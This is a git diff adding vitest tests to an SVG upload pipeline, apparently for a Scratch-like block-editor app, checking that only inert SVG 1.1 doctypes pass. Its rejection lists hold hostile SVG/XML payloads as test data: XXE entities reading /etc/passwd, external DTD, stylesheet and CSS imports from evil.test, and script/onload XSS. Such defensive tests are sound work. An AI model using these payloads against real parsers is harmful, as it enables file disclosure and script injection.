@@ -1,7 +1,7 @@
 import { createHash } from 'node:crypto';
 import { existsSync, mkdtempSync, readdirSync, readFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join } from 'node:path';
+import { join, resolve } from 'node:path';
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import type { BlocksAssetFormat } from '@asa-lab/blocks';
 import {
@@ -43,6 +43,11 @@ WAV.writeUInt32LE(2, 40);
 
 const md5 = (bytes: Uint8Array) => createHash('md5').update(bytes).digest('hex');
 const sha256 = (bytes: Uint8Array) => createHash('sha256').update(bytes).digest('hex');
+const SVG11_DOCTYPE =
+  '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">';
+const LIBRARY_SVG = readFileSync(
+  resolve('apps/api/src/testing/fixtures/scratch-library/1e2c3987e4cdb1f317b1773662719b13.svg'),
+);
 const dirs: string[] = [];
 function tempRoot(): string {
   const path = mkdtempSync(join(tmpdir(), 'asa-blocks-upload-spec-'));
@@ -74,6 +79,103 @@ const binaries: readonly [BlocksAssetFormat, Uint8Array][] = [
 ];
 
 describe('Blocks upload content capture', () => {
+  it('accepts the exact audited Scratch library SVG without changing its bytes or identities', async () => {
+    expect(LIBRARY_SVG.byteLength).toBe(586);
+    expect(md5(LIBRARY_SVG)).toBe('1e2c3987e4cdb1f317b1773662719b13');
+    expect(sha256(LIBRARY_SVG)).toBe(
+      '56a5e1d10eefec3ee23ca969e01d809d8488bf57f56733c36f57639f548fb93b',
+    );
+    const captured = await captureBlocksAssetUpload(chunks(LIBRARY_SVG), 'svg', tempRoot());
+    expect(captured).toMatchObject({
+      assetId: md5(LIBRARY_SVG),
+      sha256: sha256(LIBRARY_SVG),
+      sizeBytes: 586,
+    });
+    expect(readFileSync(captured.path)).toEqual(LIBRARY_SVG);
+    rmSync(captured.path);
+  });
+
+  it.each([
+    SVG11_DOCTYPE,
+    "<!DOCTYPE\nsvg\tPUBLIC\r\n'-//W3C//DTD SVG 1.1//EN' 'https://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd' >",
+    '<!DOCTYPE svg PUBLIC \'-//W3C//DTD SVG 1.1//EN\' "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
+  ])('accepts only the inert SVG 1.1 declaration variants unchanged %#', async (doctype) => {
+    const bytes = Buffer.from(
+      `${doctype}<svg xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g"/></defs><rect fill="url(#g)"/></svg>`,
+    );
+    const captured = await captureBlocksAssetUpload(chunks(bytes, 1), 'svg', tempRoot());
+    expect(captured).toMatchObject({
+      assetId: md5(bytes),
+      sha256: sha256(bytes),
+      sizeBytes: bytes.length,
+    });
+    expect(readFileSync(captured.path)).toEqual(bytes);
+    rmSync(captured.path);
+  });
+
+  it.each([
+    '<!DOCTYPE svg>',
+    '<!DOCTYPE svg SYSTEM "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
+    SVG11_DOCTYPE.replace('DOCTYPE svg', 'DOCTYPEsvg'),
+    SVG11_DOCTYPE.replace('svg PUBLIC', 'SVG PUBLIC'),
+    SVG11_DOCTYPE.replace('SVG 1.1//EN', 'SVG 1.0//EN'),
+    SVG11_DOCTYPE.replace('www.w3.org', 'evil.test'),
+    SVG11_DOCTYPE.replace('www.w3.org/', 'www.w3.org.evil.test/'),
+    SVG11_DOCTYPE.replace('svg11.dtd', 'svg11.dtd?external=1'),
+    SVG11_DOCTYPE.replace('svg11.dtd', 'svg11.dtd#fragment'),
+    SVG11_DOCTYPE.replace(/>$/, ' []>'),
+    SVG11_DOCTYPE.replace(/>$/, ' [<!ENTITY x SYSTEM "file:///etc/passwd">]>'),
+    SVG11_DOCTYPE.replace(/>$/, ' [<!ENTITY x "expansion">]>'),
+    SVG11_DOCTYPE.replace(/>$/, ' [<!ENTITY % x SYSTEM "https://evil.test/dtd">%x;]>'),
+    SVG11_DOCTYPE.replace(/>$/, ' extra>'),
+    SVG11_DOCTYPE.replace(/>$/, '\u2028>'),
+    SVG11_DOCTYPE.replace(/>$/, '\u2029>'),
+    SVG11_DOCTYPE.replace('svg PUBLIC ', 'svg\u00a0PUBLIC '),
+    SVG11_DOCTYPE.replace(' PUBLIC ', ' public '),
+    SVG11_DOCTYPE.replace('1.1//EN"', "1.1//EN'"),
+    SVG11_DOCTYPE + SVG11_DOCTYPE,
+  ])(
+    'rejects non-allowlisted or dangerous DTD syntax before durable writes %#',
+    async (doctype) => {
+      const root = tempRoot();
+      const bytes = Buffer.from(`${doctype}<svg/>`);
+      const h = fakes(root, bytes);
+      await expect(
+        h.pipeline.upload({
+          tenantId: TENANT_ID,
+          assetId: md5(bytes),
+          dataFormat: 'svg',
+          source: chunks(bytes),
+        }),
+      ).rejects.toMatchObject({ reason: 'blocks_asset_format_invalid' });
+      expect(h.order).toEqual([]);
+      expect(h.blobs.exists).not.toHaveBeenCalled();
+      expectUploadDirectoryEmpty(root);
+    },
+  );
+
+  it.each([
+    '<svg>&undefinedEntity;</svg>',
+    '<svg><path></svg>',
+    '<?xml-stylesheet href="https://evil.test/a.xsl"?><svg/>',
+    '<svg><script>alert(1)</script></svg>',
+    '<svg><foreignObject><p>bad</p></foreignObject></svg>',
+    '<svg><rect onload="alert(1)"/></svg>',
+    '<svg><image href="https://evil.test/a.png"/></svg>',
+    '<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>',
+    '<svg><style>@import "https://evil.test/a.css";</style></svg>',
+    '<svg><rect style="fill:url(https://evil.test/a.svg)"/></svg>',
+  ])(
+    'retains every XML/active/external-content check with an allowed declaration %#',
+    async (markup) => {
+      const root = tempRoot();
+      await expect(
+        captureBlocksAssetUpload(chunks(Buffer.from(SVG11_DOCTYPE + markup)), 'svg', root),
+      ).rejects.toMatchObject({ reason: 'blocks_asset_format_invalid' });
+      expectUploadDirectoryEmpty(root);
+    },
+  );
+
   it.each(binaries)(
     'accepts actual %s bytes and computes both identities',
     async (format, bytes) => {
@@ -182,6 +284,22 @@ function fakes(root: string, bytes: Uint8Array) {
 const TENANT_ID = '11111111-1111-4111-8111-111111111111';
 
 describe('Blocks asset-before-metadata upload pipeline', () => {
+  it('does not silently normalize a library SVG to satisfy a different path identity', async () => {
+    const root = tempRoot();
+    const h = fakes(root, LIBRARY_SVG);
+    const stripped = Buffer.from(LIBRARY_SVG.toString('utf8').replace(SVG11_DOCTYPE, ''));
+    expect(md5(stripped)).not.toBe(md5(LIBRARY_SVG));
+    await expect(
+      h.pipeline.upload({
+        tenantId: TENANT_ID,
+        assetId: md5(stripped),
+        dataFormat: 'svg',
+        source: chunks(LIBRARY_SVG),
+      }),
+    ).rejects.toMatchObject({ reason: 'blocks_asset_identity_mismatch' });
+    expect(h.order).toEqual([]);
+    expectUploadDirectoryEmpty(root);
+  });
   it('rejects malformed path identity before consuming or storing bytes', async () => {
     const root = tempRoot();
     const h = fakes(root, PNG);
